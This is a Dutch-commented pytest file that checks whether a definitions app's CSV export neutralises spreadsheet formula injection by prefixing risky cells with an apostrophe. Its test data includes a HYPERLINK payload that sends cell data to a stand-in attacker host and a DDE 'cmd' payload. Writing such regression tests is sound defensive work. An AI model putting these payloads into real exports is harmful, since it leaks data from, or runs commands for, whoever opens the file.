"""DEF-593: CSV/Excel formula injection in de export.

Excel, LibreOffice Calc en Google Sheets interpreteren een celwaarde die begint
met `=`, `+`, `-`, `@`, tab of carriage return als **formule**. Een definitie als
`=HYPERLINK("http://attacker/?d="&A1,"klik")` wordt dan uitgevoerd of aangeboden
op de machine van wie de export opent.

Dit is het enige geverifieerde pad waarlangs deze app schade buiten zichzelf kan
aanrichten. Het combineert met DEF-590: de definitietekst komt uit een LLM dat
een geüpload document als context krijgt. Maar de invoer hoeft niet eens uit het
model te komen — een gebruiker kan de payload rechtstreeks in een definitie typen.

Mitigatie conform OWASP (https://owasp.org/www-community/attacks/CSV_Injection):
prefix de cel met een apostrof, zodat de spreadsheet hem als tekst leest. Niet
strippen: de lezer moet de oorspronkelijke tekst nog kunnen zien.
"""

import csv
from datetime import UTC, datetime
from unittest.mock import Mock

import pytest

pytestmark = pytest.mark.unit

from database.definitie_repository import DefinitieRepository
from services.data_aggregation_service import DataAggregationService
from services.export_service import DefinitieExportData, ExportService

#: De zes prefixen die een spreadsheet als formule-start leest.
_GEVAARLIJKE_PREFIXEN = ("=", "+", "-", "@", "\t", "\r")

#: Een payload die in Excel een netwerkverzoek opzet.
_PAYLOAD = '=HYPERLINK("http://attacker.example/?d="&A1,"klik hier")'


@pytest.fixture
def service(tmp_path):
    export_dir = tmp_path / "exports"
    export_dir.mkdir()
    return ExportService(
        repository=Mock(spec=DefinitieRepository),
        data_aggregation_service=Mock(spec=DataAggregationService),
        export_dir=str(export_dir),
    )


def _export_data(**overrides) -> DefinitieExportData:
    basis = {
        "begrip": "toezichthouder",
        "definitie_origineel": "originele definitie",
        "definitie_gecorrigeerd": "gecorrigeerde definitie",
        "definitie_aangepast": "aangepaste definitie",
        "metadata": {"status": "DRAFT", "categorie": "proces"},
        "context_dict": {"organisatorisch": ["OM"]},
        "toetsresultaten": {"score": 0.85},
        "voorbeeld_zinnen": ["voorbeeld 1"],
        "toelichting": "toelichting",
        "synoniemen": "syn1, syn2",
        "voorkeursterm": "toezichthouder",
        "expert_review": "Goedgekeurd",
        "created_at": datetime.now(UTC),
        "updated_at": datetime.now(UTC),
    }
    basis.update(overrides)
    return DefinitieExportData(**basis)


def _lees_csv(pad: str) -> dict[str, str]:
    with open(pad, encoding="utf-8") as f:
        return next(iter(csv.DictReader(f)))


# --- De kwetsbaarheid ---------------------------------------------------------


@pytest.mark.parametrize("prefix", _GEVAARLIJKE_PREFIXEN)
def test_formule_prefix_wordt_geneutraliseerd_in_csv(service, prefix):
    """Elk van de zes prefixen moet als tekst worden weggeschreven."""
    kwaadaardig = f"{prefix}HYPERLINK(1)"
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=kwaadaardig))

    cel = _lees_csv(pad)["definitie_gecorrigeerd"]
    assert not cel.startswith(prefix), f"cel begint nog met {prefix!r}: {cel!r}"
    assert cel.startswith("'"), f"geen apostrof-prefix: {cel!r}"


def test_hyperlink_payload_in_definitie_wordt_geneutraliseerd(service):
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=_PAYLOAD))
    cel = _lees_csv(pad)["definitie_gecorrigeerd"]
    assert cel == "'" + _PAYLOAD


def test_payload_in_begrip_wordt_geneutraliseerd(service):
    """Niet alleen de definitie: elke tekstkolom is een vector."""
    pad = service._export_to_csv(_export_data(begrip=_PAYLOAD))
    assert _lees_csv(pad)["begrip"] == "'" + _PAYLOAD


def test_payload_in_metadata_wordt_geneutraliseerd(service):
    pad = service._export_to_csv(
        _export_data(metadata={"status": "=cmd|'/c calc'!A0", "categorie": "proces"})
    )
    assert _lees_csv(pad)["status"].startswith("'")


# --- Wat NIET mag veranderen --------------------------------------------------


def test_normale_tekst_blijft_onaangeroerd(service):
    pad = service._export_to_csv(_export_data())
    rij = _lees_csv(pad)
    assert rij["begrip"] == "toezichthouder"
    assert rij["definitie_gecorrigeerd"] == "gecorrigeerde definitie"
    assert "'" not in rij["begrip"]


def test_tekst_met_een_gelijkteken_middenin_blijft_intact(service):
    """Alleen het eerste teken telt; `a = b` is geen formule."""
    tekst = "de formule a = b geldt hier"
    pad = service._export_to_csv(_export_data(definitie_gecorrigeerd=tekst))
    assert _lees_csv(pad)["definitie_gecorrigeerd"] == tekst


def test_lege_waarde_geeft_geen_fout(service):
    """`""[:1]` is `""` — de guard mag niet struikelen over lege cellen."""
    pad = service._export_to_csv(_export_data(definitie_aangepast=""))
    assert _lees_csv(pad)["definitie_aangepast"] == ""


# --- De directe celguard ------------------------------------------------------


def test_niet_strings_blijven_hun_eigen_type_houden():
    """Een negatief getal is geen aanvalsvector en mag geen string worden."""
    from services.export_service import _veilige_cel

    assert _veilige_cel(-5) == -5
    assert _veilige_cel(3.14) == 3.14
    assert _veilige_cel(None) is None


def test_negatief_getal_als_string_wordt_wel_geprefixt():
    """Bewuste ruil: `"-5"` uit een tekstveld is niet te onderscheiden van een
    payload, dus die krijgt de apostrof. Numerieke velden blijven `int`/`float`
    en raken de guard niet (zie de test hierboven).
    """
    from services.export_service import _veilige_cel

    assert _veilige_cel("-5") == "'-5"


def test_guard_raakt_tekst_zonder_formuleprefix_niet():
    from services.export_service import _veilige_cel

    assert _veilige_cel("gewone tekst") == "gewone tekst"
    assert _veilige_cel("a = b") == "a = b"
    assert _veilige_cel("") == ""
